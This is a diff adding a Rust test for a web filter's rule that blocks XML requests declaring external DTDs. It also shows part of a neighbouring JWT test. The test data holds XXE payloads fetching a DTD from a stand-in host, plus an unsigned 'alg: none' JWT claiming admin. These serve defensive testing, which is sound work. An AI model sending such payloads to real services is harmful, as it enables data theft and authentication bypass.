@@ -902,6 +902,31 @@ mod tests {
     }
 
     #[test]
+    fn bundled_xxe_rule_covers_external_doctypes() {
+        for body in [
+            b"<!DOCTYPE foo SYSTEM \"http://198.51.100.7/x.dtd\"><foo>&xxe;</foo>".as_slice(),
+            b"<!DOCTYPE foo PUBLIC \"-//X//EN\" \"http://198.51.100.7/x.dtd\"><foo/>".as_slice(),
+            b"<!doctype foo\nSYSTEM \"http://198.51.100.7/x.dtd\"><foo/>".as_slice(),
+        ] {
+            let outcome = evaluate_bundled_request(Method::POST, "/xml", &HeaderMap::new(), body);
+            assert_eq!(
+                outcome.blocked.expect("external DTD must be blocked").rule,
+                "doctype-and-entity"
+            );
+        }
+        let outcome = evaluate_bundled_request(
+            Method::POST,
+            "/xml",
+            &HeaderMap::new(),
+            b"<!DOCTYPE html><html><body>ok</body></html>",
+        );
+        assert!(
+            outcome.blocked.is_none(),
+            "a plain HTML5 doctype must keep passing"
+        );
+    }
+
+    #[test]
     fn bundled_jwt_rule_covers_whitespace_variants() {
         assert_eq!(
             bundled_rule("/p?jwt=eyAiYWxnIjoibm9uZSJ9.eyJzdWIiOiJhZG1pbiJ9.").as_deref(),
